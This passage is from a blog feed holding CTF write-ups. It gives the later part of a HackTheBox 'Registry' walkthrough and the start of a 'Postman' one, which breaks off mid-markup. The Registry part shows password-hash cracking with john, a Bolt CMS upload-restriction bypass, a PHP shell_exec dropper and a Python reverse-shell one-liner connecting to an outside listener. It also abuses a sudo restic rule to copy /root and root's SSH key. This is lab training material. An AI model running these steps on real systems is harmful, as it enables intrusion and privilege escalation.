/root/.ssh/id_rsa:&quot;</span></span><br><span class="line">send <span class="string">&quot;GkOcz221Ftb3ugog\n&quot;</span>;</span><br><span class="line">expect <span class="string">&quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&quot;</span></span><br><span class="line">interact</span><br></pre></td></tr></table></figure><blockquote><p>ssh-add is a command for adding SSH private keys into the SSH authentication agent for implementing single sign-on with SSH. </p></blockquote><p>As a reminder:</p><blockquote><p> /etc/profile<br>            The systemwide initialization file, executed for login shells</p></blockquote><p>When looking in the <code>/etc/profile</code> we can see that all scripts in <code>/etc/profile.d/</code> are executed on login time:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@02c3e9ee87d2:/<span class="comment"># cat /etc/profile</span></span><br><span class="line">[...]</span><br><span class="line"><span class="keyword">if</span> [ -d /etc/profile.d ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> /etc/profile.d/*.sh; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ -r <span class="variable">$i</span> ]; <span class="keyword">then</span></span><br><span class="line">      . <span class="variable">$i</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  <span class="built_in">unset</span> i</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>We now understand why this <code>ssh-add</code> command is made on login, the combination of <code>ssh-agent</code> and <code>ssh-add</code> allow the user to connect to any server he is allowed to access without having to type in a password every time when moving between servers. </p><p>Well now that we have all the needed informations, let’s try to login to SSH again:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa bolt@registry.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;./id_rsa&#x27;</span>:</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System information as of Mon Jan 27 14:42:39 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.02              Users logged <span class="keyword">in</span>:                0</span><br><span class="line">  Usage of /:   5.6% of 61.80GB   IP address <span class="keyword">for</span> eth0:            10.10.10.159</span><br><span class="line">  Memory usage: 21%               IP address <span class="keyword">for</span> br-1bad9bd75d17: 172.18.0.1</span><br><span class="line">  Swap usage:   0%                IP address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  Processes:    154</span><br><span class="line">Last login: Mon Oct 21 10:31:48 2019 from 10.10.14.2</span><br><span class="line">bolt@bolt:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">bolt@bolt:~$ cat user.txt</span><br><span class="line">yxxxxxxxxxxxxxxxxxxxxxxxxxi</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>Alright! Now that we have access to <code>bolt</code> account. It’s time to escalate it to root.</p><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The usual quick  recon shows that <code>bolt</code> user doesn’t seems to hold anything very valuable. Let’s investigate the <code>/var/www/html/</code> directory to take a look at this <code>backup.php</code> file we found during the user recon phase:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ cat /var/www/backup.php</span><br><span class="line">&lt;?php shell_exec(<span class="string">&quot;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&quot;</span>);</span><br></pre></td></tr></table></figure><p>Alright so this php file is calling an external command to make backup it seems. The interesting point here is that the command is launched as root using <code>sudo</code>. That mean if we can find a flaw in the command we can very probably elevate our privileges to root.</p><p>Unfortunately as <code>bolt</code> user we can not run this command without inputting password. Seeing the <code>backup.php</code> file we can guess with good confidence that <code>sudo</code> have been configured to allow the Apache user (<code>www-data</code>) to run the <code>sudo</code> backup command without inputing password. This way the <code>backup.php</code> script can be run automatically through cronjob for example.</p><p>So now we need to find a way to pivot to <code>www-data</code> user to exploit this backup script. Let’s investigate.</p><h3 id="Pivot-bolt-gt-www-data"><a href="#Pivot-bolt-gt-www-data" class="headerlink" title="Pivot bolt -&gt; www-data"></a>Pivot bolt -&gt; www-data</h3><p>While looking in the <code>/var/www/html/</code> directory we find a <code>bolt/</code> folder. This one was missed by <code>gobuster</code> during our recon phase.</p><p>So what’s this bolt?<br>Opening <code>https://registry.htb/bolt</code> display an empty sample website:</p><p><img src="https://user-images.githubusercontent.com/9076747/75478718-ba171080-599e-11ea-8a71-450c96466f93.png" alt="bolt sample website"></p><p>A quick Google search gives us additional information about what Bolt is: </p><blockquote><p>Bolt is a free, open-source content management system based on PHP. It was released in 2012 and developed by Two Kings and the Bolt community. Bolt uses Twig for templates and includes features for content and user management.<br><a href="https://bolt.cm/">Bolt.cm</a></p></blockquote><p>I will add it to my usual recon list to make sure not missing it next time:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> bolt &gt;&gt; ~/SecLists/Discovery/Web-Content/big.txt</span><br></pre></td></tr></table></figure><p>Reading through the documentation we can see that the admin interface is available at <a href="https://registry.htb/bolt/bolt">https://registry.htb/bolt/bolt</a> :</p><p><img src="https://user-images.githubusercontent.com/9076747/75478994-2134c500-599f-11ea-8b40-09e1489b3d57.png" alt="bolt admin page"></p><p>No common password combination seems to work here. No need to loose time brute-forcing, since we have access the app code source through the <code>bolt</code> ssh user account let’s dig a bit there to see if we can find any interesting config files.</p><p>Looking around we quickly stumble across <code>bolt</code> sqli database in <code>/var/www/html/bolt/database/bolt.db</code>.</p><p>Let’s take a look inside for juicy information:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sqlite3 bolt.db</span><br><span class="line">SQLite version 3.30.1 2019-10-10 20:19:45</span><br><span class="line">Enter <span class="string">&quot;.help&quot;</span> <span class="keyword">for</span> usage hints.</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">bolt_authtoken    bolt_field_value  bolt_pages        bolt_users</span><br><span class="line">bolt_blocks       bolt_homepage     bolt_relations</span><br><span class="line">bolt_cron         bolt_log_change   bolt_showcases</span><br><span class="line">bolt_entries      bolt_log_system   bolt_taxonomy</span><br><span class="line">sqlite&gt; SELECT * FROM bolt_users;</span><br><span class="line">1|admin|$2y$10<span class="variable">$e</span>.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-17 14:34:52|10.10.14.2|Admin|[<span class="string">&quot;files://shell.php&quot;</span>]|1||||0||[<span class="string">&quot;root&quot;</span>,<span class="string">&quot;everyone&quot;</span>]</span><br><span class="line">sqlite&gt;</span><br></pre></td></tr></table></figure><p>The first thing that catch the attention is this <code>bolt_users</code> table. Inside we grab the password hash of user <code>Admin</code>.  </p><p>Let’s try to crack it using <code>john</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt admin.hash</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;bcrypt&quot;</span>, but the string is also recognized as <span class="string">&quot;bcrypt-opencl&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=bcrypt-opencl&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 1024 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">strawberry       (?)</span><br><span class="line">1g 0:00:00:09 DONE (2020-01-27 16:03) 0.1072g/s 36.69p/s 36.69c/s 36.69C/s strawberry..ihateyou</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>Bingo! So, we got <code>Admin:strawberry</code>, using those credentials in the admin login page works.   </p><p><img src="https://user-images.githubusercontent.com/9076747/75479875-8e952580-59a0-11ea-9bb0-54ca89137950.png" alt="bolt admin dashboard"></p><p>Looking around at the various settings we quickly come across the “File Management” setting, allowing us to upload file to the server. Sounds good to upload a web shell don’t you think? </p><p>First thing to try is to send a <code>.php</code> file to see if we can execute php on the server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php phpinfo();&quot;</span> &gt; test.php</span><br></pre></td></tr></table></figure><p>Unfortunately when trying to upload we receive the following error message:</p><p><img src="https://user-images.githubusercontent.com/9076747/75480049-e2077380-59a0-11ea-9eec-d5a3d1555d77.png" alt="bolt upload failure"></p><p>No php allowed. At this point I tried various way to bypass the file upload restrictions:</p><ul><li>Changing extension (<code>test.PHp</code>, <code>test.php7</code> since server runs PHP7)</li><li>Content-type bypass</li><li>Double extension (<code>test.php.jpg</code>, <code>test.jpg.php</code>)</li><li>Null Character (<code>test.php%00.jpg</code>)</li><li>Using GIF89a; header</li></ul><p>But didn’t managed to get any of this to work. Searching a bit farther we discover that it’s possible to change the allowed extension list in “Configuration/Main Configuration”. Even though a comment state <code>.php</code> extension are “never acceptable”, adding it to the list seems to work and let us upload php file:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Note that certain file-types are never acceptable, even if they are in this list. </span></span><br><span class="line"><span class="comment"># These types are never allowed: sh, asp, cgi, php, php3, ph3, php4, ph4, php5, ph5, </span></span><br><span class="line"><span class="comment"># phtm, phtml</span></span><br><span class="line"><span class="attr">accept_file_types:</span> [ <span class="string">php</span>, <span class="string">twig</span>, <span class="string">html</span>, <span class="string">js</span>, <span class="string">css</span>, <span class="string">scss</span>, <span class="string">gif</span>, <span class="string">jpg</span>, <span class="string">jpeg</span>, <span class="string">png</span>, <span class="string">ico</span>, <span class="string">zip</span>, <span class="string">tgz</span>, <span class="string">txt</span>, <span class="string">md</span>, <span class="string">doc</span>, <span class="string">docx</span>, <span class="string">pdf</span>, <span class="string">epub</span>, <span class="string">xls</span>, <span class="string">xlsx</span>, <span class="string">ppt</span>, <span class="string">pptx</span>, <span class="string">mp3</span>, <span class="string">ogg</span>, <span class="string">wav</span>, <span class="string">m4a</span>, <span class="string">mp4</span>, <span class="string">m4v</span>, <span class="string">ogv</span>, <span class="string">wmv</span>, <span class="string">avi</span>, <span class="string">webm</span>, <span class="string">svg</span>]</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/9076747/75481560-8c809600-59a3-11ea-8b0a-7a2c2c7f88ec.png" alt="bolt php file upload"></p><p>The php file is now accessible at <code>https://registry.htb/bolt/files/hg8.php</code>:</p><p><img src="https://user-images.githubusercontent.com/9076747/75481639-aae69180-59a3-11ea-8154-75163f358616.png" alt="bolt php file upload"></p><p>Good, we are on the right track to upload a web shell. Unfortunately it’s not that simple, the uploaded files gets deleted and configuration file reset every 1 minute or so, making it impossible to use a web shell. The good news is we do have an access to the server on ssh as <code>bolt</code> user, here is how we can proceed to get a stable shell:</p><ol><li>Create a reverse shell script with the <code>bolt</code> account on the server <code>/tmp</code> folder.</li><li>Upload a <code>.php</code> file executing this script.</li></ol><p>This way we get a reverse that will be executed as <code>www-data</code> and will stay up even after the <code>.php</code> file gets deleted. Here is one way to do so:</p><p>First let’s create the reverse shell script. I will use Python one:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ cat /tmp/hg8.py</span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,8585));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line">bolt@bolt:/$ <span class="built_in">which</span> python</span><br><span class="line">/usr/bin/python</span><br></pre></td></tr></table></figure><p>Now our php file calling this <code>hg8.py</code> reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php shell_exec(&quot;/usr/bin/python /tmp/hg8.py&quot;); ?&gt;&#x27;</span> &gt; hg8.php</span><br></pre></td></tr></table></figure><p>Finally let’s open our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And let’s redo the process, edit the configuration to allow <code>.php</code> upload, upload the <code>hg8.php</code> file and open it!</p><p>If everything goes fine and you have been fast enough the connection will open. But it doesn’t… The connection just seem to hang.</p><p>The first thing that comes to mind is that a firewall is blocking any connection from outside. Since we have an access on the machine let’s try to open our listener here instead:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ nc -l -vv -p 8585</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8585)</span><br></pre></td></tr></table></figure><p>Let’s now recreate our python reverse shell with <code>registry</code> IP, reupload and run our <code>hg8.php</code> and….</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ nc -l -vv -p 8585</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8585)</span><br><span class="line">Connection from localhost 48396 received!</span><br><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>Alright, we now have access to <code>www-data</code> account. That’s a good progress. Let’s now try to find if and how we could escalate to root privilege. </p><p>While doing the usual recon for privilege escalation, we stumble across the backup command we have seem before:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on bolt:</span><br><span class="line">    env_reset, exempt_group=sudo, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on bolt:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/restic backup -r rest*</span><br></pre></td></tr></table></figure><p>It’s the <code>restic</code> command we saw in the <code>/var/www/html/backup.php</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/var/www/html$ cat /var/www/html/backup.php</span><br><span class="line">&lt;?php shell_exec(<span class="string">&quot;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&quot;</span>);</span><br></pre></td></tr></table></figure><p>Let’s check for the documentation of <code>restic</code> to understand better how it works. According to its website:</p><blockquote><p>restic is a backup program that is fast, efficient and secure. It supports the three major operating systems<br><a href="https://restic.net/">https://restic.net/</a></p></blockquote><p>So we have a program that can be run as <code>root</code> manipulating files we can control. Sounds like a perfect scenario for privilege escalation ;)</p><p>Let’s break down the <code>restic</code> command from <code>backup.php</code> to understand exactly what’s it’s doing :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ restic --<span class="built_in">help</span></span><br><span class="line">[...]</span><br><span class="line">  backup        Create a new backup of files and/or directories</span><br><span class="line">bolt@bolt:/$ restic backup --<span class="built_in">help</span></span><br><span class="line">[...]</span><br><span class="line">  -r, --repo string              repository to backup to or restore from (default: <span class="variable">$RESTIC_REPOSITORY</span>)</span><br></pre></td></tr></table></figure><p>Alright so if we take this command as example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">restic backup -r rest:http://backup.registry.htb/bolt bolt</span><br></pre></td></tr></table></figure><p><code>restic</code> is going to back up the <code>bolt</code> folder to the distant repository available at <code>http://backup.registry.htb</code>.</p><p>Looking around it seems we can not access nor do anything at <code>http://backup.registry.htb</code>. But anyway what lays there ? According to the <code>restic</code> documentation it’s the url of a <code>restic</code> remote repository. Reading a bit more we can find a tool (<a href="https://github.com/restic/rest-server"><code>restic-rest-server</code></a>) to create those remote repositories:</p><blockquote><p>Rest Server is a high performance HTTP server that implements restic’s REST backend API. It provides secure and efficient way to backup data remotely, using restic backup client via the rest: URL.<br><a href="https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server">https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server</a></p></blockquote><p>Seeing this we can understand it’s what is being used on <code>http://backup.registry.htb</code>.  </p><p>With all those information in mind we start to understand how we could read files with escalated privileges:</p><ol><li>Setup a local <code>restic</code> backup server</li><li>Use the following command that <code>www-data</code> can run as <code>sudo</code> without password: </li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/restic backup -r rest:http://our-restic-repo.local /root/</span><br></pre></td></tr></table></figure><ol start="3"><li>Navigate to the <code>/root/</code> folder that <code>restic</code> backup to grab the flag.</li></ol><p>It’s not yet a root shell but it should be good enough to grab the <code>root.txt</code> flag.</p><p>Alright so that was the idea, let’s see in practice now!</p><h3 id="Restic-privileged-file-read"><a href="#Restic-privileged-file-read" class="headerlink" title="Restic privileged file read"></a>Restic privileged file read</h3><p>First thing first let’s build the restic <code>rest-server</code> binary:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ git <span class="built_in">clone</span> https://github.com/restic/rest-server.git &amp;&amp; <span class="built_in">cd</span> rest-server</span><br><span class="line">[hg8@archbook ~]$ go run build.go</span><br></pre></td></tr></table></figure><p>Let’s now push the binary to the server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ scp -i id_rsa rest-server bolt@registry.htb:/tmp/</span><br></pre></td></tr></table></figure><p>We can now check the documentation to understand how to run it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/tmp/$ ./rest-server --<span class="built_in">help</span></span><br><span class="line">Run a REST server <span class="keyword">for</span> use with restic</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  rest-server [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --append-only         <span class="built_in">enable</span> append only mode</span><br><span class="line">      --cpu-profile string  write CPU profile to file</span><br><span class="line">      --debug               output debug messages</span><br><span class="line">  -h, --<span class="built_in">help</span>                <span class="built_in">help</span> <span class="keyword">for</span> rest-server</span><br><span class="line">      --listen string       listen address (default <span class="string">&quot;:8000&quot;</span>)</span><br><span class="line">      --<span class="built_in">log</span> string          <span class="built_in">log</span> HTTP requests <span class="keyword">in</span> the combined <span class="built_in">log</span> format</span><br><span class="line">      --no-auth             <span class="built_in">disable</span> .htpasswd authentication</span><br><span class="line">      --path string         data directory (default <span class="string">&quot;/tmp/restic&quot;</span>)</span><br><span class="line">      --private-repos       users can only access their private repo</span><br><span class="line">      --prometheus          <span class="built_in">enable</span> Prometheus metrics</span><br><span class="line">      --tls                 turn on TLS support</span><br><span class="line">      --tls-cert string     TLS certificate path</span><br><span class="line">      --tls-key string      TLS key path</span><br><span class="line">  -V, --version             show version and quit</span><br></pre></td></tr></table></figure><p>We have all the needed informations so let’s give a try here. First, still according to the documentation, we need to setup the repository folder :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ restic init --repo /tmp/hg8-backup</span><br><span class="line">enter password <span class="keyword">for</span> new repository:</span><br><span class="line">enter password again:</span><br><span class="line">created restic repository 14de0bc276 at /tmp/hg8-backup</span><br><span class="line"></span><br><span class="line">Please note that knowledge of your password is required to access</span><br><span class="line">the repository. Losing your password means that your data is</span><br><span class="line">irrecoverably lost.</span><br></pre></td></tr></table></figure><p>Now we can start the <code>rest-server</code> with this backup path:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/tmp/$ ./rest-server --path ./hg8-backup --no-auth</span><br><span class="line">Data directory: ./registrybackup</span><br><span class="line">Authentication disabled</span><br><span class="line">Private repositories disabled</span><br><span class="line">Starting server on :8000</span><br></pre></td></tr></table></figure><p>Sounds all good for the repository! Let’s now try to backup the <code>/root/</code> folder to our backup repository using the <code>sudo</code> command we are allowed to run without password:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@bolt:/$ sudo /usr/bin/restic backup -r rest:http://localhost:8000 /root</span><br><span class="line">enter password <span class="keyword">for</span> repository:</span><br><span class="line">password is correct</span><br><span class="line">scanned 10 directories, 14 files <span class="keyword">in</span> 0:00</span><br><span class="line">[0:00] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00</span><br><span class="line">duration: 0:00</span><br><span class="line">snapshot 0547cce5 saved</span><br></pre></td></tr></table></figure><p><code>0 errors</code> that’s good! Now it’s time to access the file we just backup:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$  restic -r /tmp/hg8-backup/ snapshots</span><br><span class="line">enter password <span class="keyword">for</span> repository:</span><br><span class="line">password is correct</span><br><span class="line">ID        Date                 Host        Tags        Directory</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">0547cce5  2020-01-28 11:51:15  bolt                    /root</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">9 snapshots</span><br><span class="line"></span><br><span class="line">bolt@bolt:/$ restic -r /tmp/hg8-backup/ restore 0547cce5 --target /tmp/restored-root</span><br><span class="line">enter password <span class="keyword">for</span> repository:</span><br><span class="line">password is correct</span><br><span class="line">restoring &lt;Snapshot 0547cce5 of [/root] at 2020-01-28 11:51:15.656860319 +0000 UTC by root@bolt&gt; to /tmp/restored-root</span><br></pre></td></tr></table></figure><p>All that remains to do now is retrieving our flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/tmp$ cat /tmp/restored-root/root/root.txt</span><br><span class="line">ntxxxxxxxxxxxxxxxxxxxxxxxxxxxgw</span><br></pre></td></tr></table></figure><p>Looking around we can even find the <code>root</code> account private ssh key and use it to obtain a root shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ ssh -i /tmp/restored-root/root/.ssh/id_rsa root@registry.htb</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System information as of Tue Jan 28 11:55:43 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Users logged <span class="keyword">in</span>:                1</span><br><span class="line">  Usage of /:   5.6% of 61.80GB   IP address <span class="keyword">for</span> eth0:            10.10.10.159</span><br><span class="line">  Memory usage: 26%               IP address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  Swap usage:   0%                IP address <span class="keyword">for</span> br-1bad9bd75d17: 172.18.0.1</span><br><span class="line">  Processes:    173</span><br><span class="line">Last login: Mon Oct 21 09:53:48 2019</span><br><span class="line">root@bolt:~<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>As always do not hesitate to contact me for any questions or feedbacks :)</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Hard Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> enumeration </tag>
            
            <tag> webshell </tag>
            
            <tag> sudo </tag>
            
            <tag> docker </tag>
            
            <tag> php </tag>
            
            <tag> shell_exec </tag>
            
            <tag> registry </tag>
            
            <tag> docker-registry </tag>
            
            <tag> restic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Postman</title>
      <link href="/posts/postman/"/>
      <url>/posts/postman/</url>
      
        <content type="html"><![CDATA[<img width="579" alt="postman-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158578-15afb680-9889-11ea-8f61-43fd6bd253f8.png"><p>Postman just retired on HackTheBox. It was an easy difficulty box. It was quite quick but nice to solve. It can be really interesting if you want to learn and play with the now widely used Redis.  </p><p><strong>Tl;Dr:</strong> The user flag consisted in exploiting a redis instance accessible without authentication. From this instance you would bruteforce the passphrase of a SSH key found in a backup folder and use its password to pivot from <code>redis</code> user to <code>Matt</code> user.<br>Using the same password we could login to a Webmin panel and use an exploit (CVE-2019-12840) to achieve remote commands execution as root and grab the flag.</p><p>Alright, let’s get into it!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.160 postman.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span 